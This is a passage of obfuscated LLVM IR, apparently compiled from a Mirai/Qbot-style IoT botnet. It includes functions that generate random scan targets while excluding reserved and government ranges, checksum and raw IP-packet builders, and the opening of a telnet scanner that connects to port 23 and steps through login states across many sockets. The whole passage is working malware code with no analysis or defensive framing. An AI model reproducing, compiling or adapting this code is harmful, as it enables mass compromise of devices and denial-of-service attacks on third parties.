  %83 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %84 = zext i8 %83 to i32
  %85 = icmp eq i32 %84, 198
  br i1 %85, label %86, label %94

; <label>:86:                                     ; preds = %82
  %87 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 1), align 1
  %88 = zext i8 %87 to i32
  %89 = icmp sge i32 %88, 18
  br i1 %89, label %90, label %94

; <label>:90:                                     ; preds = %86
  %91 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 1), align 1
  %92 = zext i8 %91 to i32
  %93 = icmp slt i32 %92, 20
  br i1 %93, label %152, label %94

; <label>:94:                                     ; preds = %90, %86, %82
  %95 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %96 = zext i8 %95 to i32
  %97 = icmp eq i32 %96, 224
  br i1 %97, label %152, label %98

; <label>:98:                                     ; preds = %94
  %99 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %100 = zext i8 %99 to i32
  %101 = icmp eq i32 %100, 6
  br i1 %101, label %150, label %102

; <label>:102:                                    ; preds = %98
  %103 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 7
  br i1 %105, label %150, label %106

; <label>:106:                                    ; preds = %102
  %107 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %108 = zext i8 %107 to i32
  %109 = icmp eq i32 %108, 11
  br i1 %109, label %150, label %110

; <label>:110:                                    ; preds = %106
  %111 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %112 = zext i8 %111 to i32
  %113 = icmp eq i32 %112, 21
  br i1 %113, label %150, label %114

; <label>:114:                                    ; preds = %110
  %115 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %116 = zext i8 %115 to i32
  %117 = icmp eq i32 %116, 22
  br i1 %117, label %150, label %118

; <label>:118:                                    ; preds = %114
  %119 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %120 = zext i8 %119 to i32
  %121 = icmp eq i32 %120, 26
  br i1 %121, label %150, label %122

; <label>:122:                                    ; preds = %118
  %123 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %124 = zext i8 %123 to i32
  %125 = icmp eq i32 %124, 28
  br i1 %125, label %150, label %126

; <label>:126:                                    ; preds = %122
  %127 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %128 = zext i8 %127 to i32
  %129 = icmp eq i32 %128, 29
  br i1 %129, label %150, label %130

; <label>:130:                                    ; preds = %126
  %131 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %132 = zext i8 %131 to i32
  %133 = icmp eq i32 %132, 30
  br i1 %133, label %150, label %134

; <label>:134:                                    ; preds = %130
  %135 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %136 = zext i8 %135 to i32
  %137 = icmp eq i32 %136, 33
  br i1 %137, label %150, label %138

; <label>:138:                                    ; preds = %134
  %139 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %140 = zext i8 %139 to i32
  %141 = icmp eq i32 %140, 55
  br i1 %141, label %150, label %142

; <label>:142:                                    ; preds = %138
  %143 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %144 = zext i8 %143 to i32
  %145 = icmp eq i32 %144, 214
  br i1 %145, label %150, label %146

; <label>:146:                                    ; preds = %142
  %147 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %148 = zext i8 %147 to i32
  %149 = icmp eq i32 %148, 215
  br label %150

; <label>:150:                                    ; preds = %146, %142, %138, %134, %130, %126, %122, %118, %114, %110, %106, %102, %98
  %151 = phi i1 [ true, %142 ], [ true, %138 ], [ true, %134 ], [ true, %130 ], [ true, %126 ], [ true, %122 ], [ true, %118 ], [ true, %114 ], [ true, %110 ], [ true, %106 ], [ true, %102 ], [ true, %98 ], [ %149, %146 ]
  br label %152

; <label>:152:                                    ; preds = %150, %94, %90, %78, %70, %58, %46, %38, %34, %30, %26, %22, %18, %14
  %153 = phi i1 [ true, %94 ], [ true, %90 ], [ true, %78 ], [ true, %70 ], [ true, %58 ], [ true, %46 ], [ true, %38 ], [ true, %34 ], [ true, %30 ], [ true, %26 ], [ true, %22 ], [ true, %18 ], [ true, %14 ], [ %151, %150 ]
  br i1 %153, label %154, label %167

; <label>:154:                                    ; preds = %152
  %155 = call i32 @rand() #5
  %156 = srem i32 %155, 223
  %157 = trunc i32 %156 to i8
  store i8 %157, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %158 = call i32 @rand() #5
  %159 = srem i32 %158, 255
  %160 = trunc i32 %159 to i8
  store i8 %160, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 1), align 1
  %161 = call i32 @rand() #5
  %162 = srem i32 %161, 255
  %163 = trunc i32 %162 to i8
  store i8 %163, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 2), align 1
  %164 = call i32 @rand() #5
  %165 = srem i32 %164, 255
  %166 = trunc i32 %165 to i8
  store i8 %166, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 3), align 1
  br label %14

; <label>:167:                                    ; preds = %152
  %168 = bitcast [16 x i8]* %1 to i8*
  call void @llvm.memset.p0i8.i64(i8* %168, i8 0, i64 16, i32 16, i1 false)
  %169 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %170 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %171 = zext i8 %170 to i32
  %172 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 1), align 1
  %173 = zext i8 %172 to i32
  %174 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 2), align 1
  %175 = zext i8 %174 to i32
  %176 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 3), align 1
  %177 = zext i8 %176 to i32
  %178 = call i32 (i8*, i8*, ...) @szprintf(i8* %169, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.114, i32 0, i32 0), i32 %171, i32 %173, i32 %175, i32 %177)
  %179 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %180 = call i32 @inet_addr(i8* %179) #5
  ret i32 %180
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #10
  %6 = load i32, i32* %2, align 4
  %7 = xor i32 %6, -1
  %8 = xor i32 %5, %7
  %9 = and i32 %8, %5
  %10 = and i32 %5, %6
  store i32 %9, i32* %3, align 4
  %11 = load i32, i32* %3, align 4
  %12 = call i32 @rand_cmwc()
  %13 = load i32, i32* %2, align 4
  %14 = xor i32 %13, -1
  %15 = and i32 -1, %14
  %16 = xor i32 -1, -1
  %17 = and i32 %13, %16
  %18 = or i32 %15, %17
  %19 = xor i32 %13, -1
  %20 = xor i32 %12, -1
  %21 = xor i32 %18, -1
  %22 = xor i32 100374753, -1
  %23 = or i32 %20, %21
  %24 = or i32 100374753, %22
  %25 = xor i32 %23, -1
  %26 = and i32 %25, %24
  %27 = and i32 %12, %18
  %28 = xor i32 %11, -1
  %29 = and i32 %26, %28
  %30 = xor i32 %26, -1
  %31 = and i32 %11, %30
  %32 = or i32 %29, %31
  %33 = xor i32 %11, %26
  ret i32 %32
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #6

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %9, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  br i1 %8, label %9, label %24

; <label>:9:                                      ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = sub i64 %14, 7465360731568194107
  %16 = add i64 %15, %13
  %17 = add i64 %16, 7465360731568194107
  %18 = add i64 %14, %13
  store i64 %17, i64* %5, align 8
  %19 = load i32, i32* %4, align 4
  %20 = add i32 %19, 1191035103
  %21 = sub i32 %20, 2
  %22 = sub i32 %21, 1191035103
  %23 = sub nsw i32 %19, 2
  store i32 %22, i32* %4, align 4
  br label %6

; <label>:24:                                     ; preds = %6
  %25 = load i32, i32* %4, align 4
  %26 = icmp sgt i32 %25, 0
  br i1 %26, label %27, label %37

; <label>:27:                                     ; preds = %24
  %28 = load i16*, i16** %3, align 8
  %29 = bitcast i16* %28 to i8*
  %30 = load i8, i8* %29, align 1
  %31 = zext i8 %30 to i64
  %32 = load i64, i64* %5, align 8
  %33 = add i64 %32, -742409223576684808
  %34 = add i64 %33, %31
  %35 = sub i64 %34, -742409223576684808
  %36 = add i64 %32, %31
  store i64 %35, i64* %5, align 8
  br label %37

; <label>:37:                                     ; preds = %27, %24
  br label %38

; <label>:38:                                     ; preds = %42, %37
  %39 = load i64, i64* %5, align 8
  %40 = lshr i64 %39, 16
  %41 = icmp ne i64 %40, 0
  br i1 %41, label %42, label %53

; <label>:42:                                     ; preds = %38
  %43 = load i64, i64* %5, align 8
  %44 = xor i64 65535, -1
  %45 = xor i64 %43, %44
  %46 = and i64 %45, %43
  %47 = and i64 %43, 65535
  %48 = load i64, i64* %5, align 8
  %49 = lshr i64 %48, 16
  %50 = sub i64 0, %49
  %51 = sub i64 %46, %50
  %52 = add i64 %46, %49
  store i64 %51, i64* %5, align 8
  br label %38

; <label>:53:                                     ; preds = %38
  %54 = load i64, i64* %5, align 8
  %55 = xor i64 %54, -1
  %56 = and i64 -785245950184419178, %55
  %57 = xor i64 -785245950184419178, -1
  %58 = and i64 %54, %57
  %59 = xor i64 -1, -1
  %60 = and i64 %59, -785245950184419178
  %61 = and i64 -1, %57
  %62 = or i64 %56, %58
  %63 = or i64 %60, %61
  %64 = xor i64 %62, %63
  %65 = xor i64 %54, -1
  %66 = trunc i64 %64 to i16
  ret i16 %66
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #10
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 %28) #5
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %32, i8* %33, i64 24, i32 1, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %36, i8* %38, i64 20, i32 1, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #5
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #2

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = xor i8 -16, -1
  %15 = xor i8 %13, %14
  %16 = and i8 %15, %13
  %17 = and i8 %13, -16
  %18 = and i8 %16, 5
  %19 = xor i8 %16, 5
  %20 = or i8 %18, %19
  %21 = or i8 %16, 5
  store i8 %20, i8* %12, align 4
  %22 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %23 = bitcast %struct.iphdr* %22 to i8*
  %24 = load i8, i8* %23, align 4
  %25 = xor i8 15, -1
  %26 = xor i8 %24, %25
  %27 = and i8 %26, %24
  %28 = and i8 %24, 15
  %29 = and i8 %27, 64
  %30 = xor i8 %27, 64
  %31 = or i8 %29, %30
  %32 = or i8 %27, 64
  store i8 %31, i8* %23, align 4
  %33 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %34 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %33, i32 0, i32 1
  store i8 0, i8* %34, align 1
  %35 = load i32, i32* %10, align 4
  %36 = sext i32 %35 to i64
  %37 = sub i64 20, 3593656221881298496
  %38 = add i64 %37, %36
  %39 = add i64 %38, 3593656221881298496
  %40 = add i64 20, %36
  %41 = trunc i64 %39 to i16
  %42 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %43 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %42, i32 0, i32 2
  store i16 %41, i16* %43, align 2
  %44 = call i32 @rand_cmwc()
  %45 = trunc i32 %44 to i16
  %46 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 3
  store i16 %45, i16* %47, align 4
  %48 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %49 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %48, i32 0, i32 4
  store i16 0, i16* %49, align 2
  %50 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %51 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %50, i32 0, i32 5
  store i8 -1, i8* %51, align 4
  %52 = load i8, i8* %9, align 1
  %53 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %54 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %53, i32 0, i32 6
  store i8 %52, i8* %54, align 1
  %55 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %56 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %55, i32 0, i32 7
  store i16 0, i16* %56, align 2
  %57 = load i32, i32* %8, align 4
  %58 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %59 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %58, i32 0, i32 8
  store i32 %57, i32* %59, align 4
  %60 = load i32, i32* %7, align 4
  %61 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %62 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %61, i32 0, i32 9
  store i32 %60, i32* %62, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  %5 = icmp sgt i32 3, %4
  br i1 %5, label %6, label %7

; <label>:6:                                      ; preds = %1
  store i32 1, i32* %2, align 4
  br label %10

; <label>:7:                                      ; preds = %1
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* %2, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %6
  %11 = load i32, i32* %2, align 4
  ret i32 %11
}

; Function Attrs: noinline nounwind uwtable
define void @TelnetScanner(i32, i32) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [128 x i8], align 16
  %11 = alloca i8, align 1
  %12 = alloca %struct.fd_set, align 8
  %13 = alloca %struct.timeval, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [256 x i8], align 16
  %17 = alloca i8*, align 8
  %18 = alloca %struct.sockaddr_in, align 4
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca [80 x i8], align 16
  store i32 %0, i32* %3, align 4
  store i32 %1, i32* %4, align 4
  %24 = call i32 @getdtablesize() #5
  %25 = sub i32 0, 100
  %26 = add i32 %24, %25
  %27 = sub nsw i32 %24, 100
  store i32 %26, i32* %5, align 4
  %28 = load i32, i32* %5, align 4
  %29 = load i32, i32* %4, align 4
  %30 = icmp sgt i32 %28, %29
  br i1 %30, label %31, label %33

; <label>:31:                                     ; preds = %2
  %32 = load i32, i32* %4, align 4
  store i32 %32, i32* %5, align 4
  br label %33

; <label>:33:                                     ; preds = %31, %2
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %34, align 4
  %35 = call zeroext i16 @htons(i16 zeroext 23) #10
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %35, i16* %36, align 2
  %37 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %38 = getelementptr inbounds [8 x i8], [8 x i8]* %37, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %38, i8 0, i64 8, i32 4, i1 false)
  %39 = call noalias i8* @malloc(i64 1025) #5
  store i8* %39, i8** %17, align 8
  %40 = load i8*, i8** %17, align 8
  call void @llvm.memset.p0i8.i64(i8* %40, i8 0, i64 1025, i32 1, i1 false)
  %41 = load i32, i32* %5, align 4
  %42 = zext i32 %41 to i64
  %43 = call i8* @llvm.stacksave()
  store i8* %43, i8** %19, align 8
  %44 = alloca %struct.telstate_t, i64 %42, align 16
  %45 = bitcast %struct.telstate_t* %44 to i8*
  %46 = load i32, i32* %5, align 4
  %47 = sext i32 %46 to i64
  %48 = mul i64 %47, 5
  call void @llvm.memset.p0i8.i64(i8* %45, i8 0, i64 %48, i32 16, i1 false)
  store i32 0, i32* %6, align 4
  br label %49

; <label>:49:                                     ; preds = %67, %33
  %50 = load i32, i32* %6, align 4
  %51 = load i32, i32* %5, align 4
  %52 = icmp slt i32 %50, %51
  br i1 %52, label %53, label %73

; <label>:53:                                     ; preds = %49
  %54 = load i32, i32* %6, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %55
  %57 = bitcast %struct.telstate_t* %56 to i8*
  call void @llvm.memset.p0i8.i64(i8* %57, i8 0, i64 32, i32 16, i1 false)
  %58 = load i32, i32* %6, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %59
  %61 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i32 0, i32 3
  store i8 1, i8* %61, align 1
  %62 = load i8*, i8** %17, align 8
  %63 = load i32, i32* %6, align 4
  %64 = sext i32 %63 to i64
  %65 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %64
  %66 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %65, i32 0, i32 9
  store i8* %62, i8** %66, align 8
  br label %67

; <label>:67:                                     ; preds = %53
  %68 = load i32, i32* %6, align 4
  %69 = add i32 %68, 2076022360
  %70 = add i32 %69, 1
  %71 = sub i32 %70, 2076022360
  %72 = add nsw i32 %68, 1
  store i32 %71, i32* %6, align 4
  br label %49

; <label>:73:                                     ; preds = %49
  br label %74

; <label>:74:                                     ; preds = %890, %73
  br label %75

; <label>:75:                                     ; preds = %74
  store i32 0, i32* %6, align 4
  br label %76

; <label>:76:                                     ; preds = %885, %75
  %77 = load i32, i32* %6, align 4
  %78 = load i32, i32* %5, align 4
  %79 = icmp slt i32 %77, %78
  br i1 %79, label %80, label %890

; <label>:80:                                     ; preds = %76
  %81 = load i32, i32* %6, align 4
  %82 = sext i32 %81 to i64
  %83 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %82
  %84 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %83, i32 0, i32 7
  %85 = load i32, i32* %84, align 16
  %86 = icmp eq i32 %85, 0
  br i1 %86, label %87, label %94

; <label>:87:                                     ; preds = %80
  %88 = call i64 @time(i64* null) #5
  %89 = trunc i64 %88 to i32
  %90 = load i32, i32* %6, align 4
  %91 = sext i32 %90 to i64
  %92 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %91
  %93 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %92, i32 0, i32 7
  store i32 %89, i32* %93, align 16
  br label %94

; <label>:94:                                     ; preds = %87, %80
  %95 = load i32, i32* %6, align 4
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %96
  %98 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %97, i32 0, i32 2
  %99 = load i8, i8* %98, align 8
  %100 = zext i8 %99 to i32
  switch i32 %100, label %884 [
    i32 0, label %101
    i32 1, label %258
    i32 2, label %375
    i32 3, label %430
    i32 4, label %475
    i32 5, label %529
    i32 6, label %574
    i32 7, label %676
    i32 8, label %720
  ]

; <label>:101:                                    ; preds = %94
  %102 = load i32, i32* %6, align 4
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %103
  %105 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %104, i32 0, i32 3
  %106 = load i8, i8* %105, align 1
  %107 = zext i8 %106 to i32
  %108 = icmp eq i32 %107, 1
  br i1 %108, label %109, label %129

; <label>:109:                                    ; preds = %101
  %110 = load i32, i32* %6, align 4
  %111 = sext i32 %110 to i64
  %112 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %111
  %113 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %112, i32 0, i32 9
  %114 = load i8*, i8** %113, align 8
  store i8* %114, i8** %20, align 8
  %115 = load i32, i32* %6, align 4
  %116 = sext i32 %115 to i64
  %117 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %116
  %118 = bitcast %struct.telstate_t* %117 to i8*
  call void @llvm.memset.p0i8.i64(i8* %118, i8 0, i64 32, i32 16, i1 false)
  %119 = load i8*, i8** %20, align 8
  %120 = load i32, i32* %6, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %121
  %123 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %122, i32 0, i32 9
  store i8* %119, i8** %123, align 8
  %124 = call i32 @TelnetIPRanges()
  %125 = load i32, i32* %6, align 4
  %126 = sext i32 %125 to i64
  %127 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %126
  %128 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %127, i32 0, i32 1
  store i32 %124, i32* %128, align 4
  br label %183

; <label>:129:                                    ; preds = %101
  %130 = load i32, i32* %6, align 4
  %131 = sext i32 %130 to i64
  %132 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %131
  %133 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %132, i32 0, i32 3
  %134 = load i8, i8* %133, align 1
  %135 = zext i8 %134 to i32
  %136 = icmp eq i32 %135, 0
  br i1 %136, label %137, label %182

; <label>:137:                                    ; preds = %129
  %138 = load i32, i32* %6, align 4
  %139 = sext i32 %138 to i64
  %140 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %139
  %141 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %140, i32 0, i32 4
  %142 = load i8, i8* %141, align 2
  %143 = sub i8 %142, -123
  %144 = add i8 %143, 1
  %145 = add i8 %144, -123
  %146 = add i8 %142, 1
  store i8 %145, i8* %141, align 2
  %147 = load i32, i32* %6, align 4
  %148 = sext i32 %147 to i64
  %149 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %148
  %150 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %149, i32 0, i32 5
  %151 = load i8, i8* %150, align 1
  %152 = sub i8 %151, -23
  %153 = add i8 %152, 1
  %154 = add i8 %153, -23
  %155 = add i8 %151, 1
  store i8 %154, i8* %150, align 1
  %156 = load i32, i32* %6, align 4
  %157 = sext i32 %156 to i64
  %158 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %157
  %159 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %158, i32 0, i32 5
  %160 = load i8, i8* %159, align 1
  %161 = zext i8 %160 to i64
  %162 = icmp eq i64 %161, 6
  br i1 %162, label %163, label %168

; <label>:163:                                    ; preds = %137
  %164 = load i32, i32* %6, align 4
  %165 = sext i32 %164 to i64
  %166 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %165
  %167 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %166, i32 0, i32 3
  store i8 1, i8* %167, align 1
  br label %168

; <label>:168:                                    ; preds = %163, %137
  %169 = load i32, i32* %6, align 4
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %170
  %172 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %171, i32 0, i32 4
  %173 = load i8, i8* %172, align 2
  %174 = zext i8 %173 to i64
  %175 = icmp eq i64 %174, 6
  br i1 %175, label %176, label %181

; <label>:176:                                    ; preds = %168
  %177 = load i32, i32* %6, align 4
  %178 = sext i32 %177 to i64
  %179 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %178
  %180 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %179, i32 0, i32 3
  store i8 1, i8* %180, align 1
  br label %885

; <label>:181:                                    ; preds = %168
  br label %182

; <label>:182:                                    ; preds = %181, %129
  br label %183

; <label>:183:                                    ; preds = %182, %109
